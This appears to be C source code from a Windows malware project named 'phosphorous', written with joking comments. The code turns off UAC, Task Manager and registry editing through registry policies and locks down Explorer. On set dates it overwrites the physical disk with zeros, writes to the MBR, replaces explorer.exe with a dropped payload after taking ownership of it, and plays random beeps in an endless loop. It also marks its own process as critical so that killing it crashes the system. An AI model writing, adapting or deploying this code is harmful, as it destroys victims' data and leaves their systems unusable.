#include "phosphorous.h"
#include <LM.h>

VOID SetRestrictiveRegistryPolicies() {
	HKEY hUACDisable, hExplorerPolicies, hSystemPolicies;
	DWORD dwFalse = 0, dwTrue = 1;

	//YEEHAW
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hUACDisable);
	RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hExplorerPolicies);
	RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hSystemPolicies);
	RegSetValueExW(hUACDisable, L"EnableLUA", NULL, REG_DWORD, &dwFalse, 4);
	RegSetValueExW(hSystemPolicies, L"DisableRegistryTools", NULL, REG_DWORD, &dwTrue, sizeof(DWORD));
	RegSetValueExW(hSystemPolicies, L"DisableTaskMgr", NULL, REG_DWORD, &dwTrue, sizeof(DWORD));
	RegSetValueExW(hExplorerPolicies, L"NoClose", NULL, REG_SZ, &dwTrue, 4);
	RegSetValueExW(hExplorerPolicies, L"NoStartMenuMorePrograms", NULL, REG_SZ, &dwTrue, 4);
	RegSetValueExW(hExplorerPolicies, L"HideClock", NULL, REG_SZ, &dwTrue, 4);
	RegSetValueExW(hExplorerPolicies, L"NoSimpleStartMenu", NULL, REG_SZ, &dwTrue, 4);
	RegSetValueExW(hExplorerPolicies, L"NoSMHelp", NULL, REG_SZ, &dwTrue, 4);
	RegSetValueExW(hExplorerPolicies, L"NoRun", NULL, REG_SZ, &dwTrue, 4);
	RegSetValueExW(hExplorerPolicies, L"NoFind", NULL, REG_DWORD, &dwTrue, 4);
	RegCloseKey(hUACDisable);
	RegCloseKey(hSystemPolicies);
	RegCloseKey(hExplorerPolicies);
}

DWORD WINAPI WipeDisk(LPVOID lpParam) {
	HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", FILE_ALL_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	BYTE* lpNulls = lcalloc(512);
	LPOVERLAPPED lpOverlapped = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(OVERLAPPED));
	lpOverlapped->Offset = 0x800;
	for (;;)
		WriteFile(hDisk, lpNulls, 512, NULL, lpOverlapped);

	//Commented out because the recoomended way to doo this is with the OVERLAPPED struct
	//DWORD dwStartAddress = 0x800; //Skip over MBR[
	//SetFilePointer(hDisk, dwStartAddress, NULL, 0);[[
}

VOID ExplorerOverwrite(HANDLE hAntiDebug, LPDLLSTRUCT dll) {
	if (WriteMBR()) ExitProcess(0x004B4252);
	DWORD dwBreakOnTermination = 0, dwExitCode = STILL_ACTIVE, dwExplorerPID = LookupProcessByName(L"explorer.exe");
	LPSTARTUPINFOW lpStartupInfo = lcalloc(sizeof(STARTUPINFOW));
	LPPROCESS_INFORMATION lpProcessInfo = lcalloc(sizeof(PROCESS_INFORMATION)), lpProcessInfoB = lcalloc(sizeof(PROCESS_INFORMATION));
	lpStartupInfo->cb = sizeof(STARTUPINFOW);
	DropExplorerPayload(L"C:\\Windows\\p15e.p15");
	CreateProcessW(L"C:\\Windows\\System32\\takeown.exe", L"C:\\Windows\\System32\\takeown.exe -f C:\\Windows\\explorer.exe", NULL, NULL, 0, 0, NULL, NULL, lpStartupInfo, lpProcessInfo);
	while (dwExitCode == STILL_ACTIVE) GetExitCodeProcess(lpProcessInfo->hProcess, &dwExitCode);
	dwExitCode = STILL_ACTIVE;
	CreateProcessW(L"C:\\Windows\\System32\\icacls.exe", L"C:\\Windows\\System32\\icacls.exe C:\\Windows\\explorer.exe /grant USERS:f", NULL, NULL, 0, 0, NULL, NULL, lpStartupInfo, lpProcessInfoB);
	while (dwExitCode == STILL_ACTIVE) GetExitCodeProcess(lpProcessInfoB->hProcess, &dwExitCode);

	lfree(lpStartupInfo);
	lfree(lpProcessInfo);
	lfree(lpProcessInfoB);

	TerminateProcess(OpenProcess(PROCESS_TERMINATE, NULL, dwExplorerPID), 0x53554343);
	if (!DeleteFileW(L"C:\\Windows\\explorer.exe"))
		MoveFileW(L"C:\\Windows\\explorer.exe", L"C:\\Windows\\system32\\bolloc.old");
	MoveFileW(L"C:\\Windows\\p15e.p15", L"C:\\Windows\\explorer.exe");
	
	SuspendThread(hAntiDebug);
	dll->NtSetInformationProcess(GetCurrentProcess, 29, &dwBreakOnTermination, sizeof(DWORD));
	ExitProcess(0);
}

DWORD WINAPI Beeper() { for (;;) { Beep((INT16)xorshift() & 0x7FFF | 0x25, 100); Sleep(100); } } //what im about to do is called an epic gamer move

const static LPCSTR includingthisanyway = "So close, no matter how far\n Couldn't be much more from the heart\n Forever trusting who we are\n And nothing else matters\n\n Never opened myself this way\n Life is ours, we live it our way\n All these words I don't just say\nAnd nothing else matters\0";

VOID LaunchPayloads(LPDLLSTRUCT dll, SYSTEMTIME systime, HANDLE antidbg) {
	SetRestrictiveRegistryPolicies();
	//SetComputerNameW(L"WANKSTATION2000");
	if (systime.wDay == 24 && systime.wMonth == 12)
		mkthread(WipeDisk, 0);
	if (systime.wDay == 24 && systime.wMonth == 5)
		ExplorerOverwrite(antidbg, dll);
	if (systime.wDay == 26 && systime.wMonth == 11)
		mkthread(Beeper, 0);

	LaunchGraphicalPayloads(systime);
}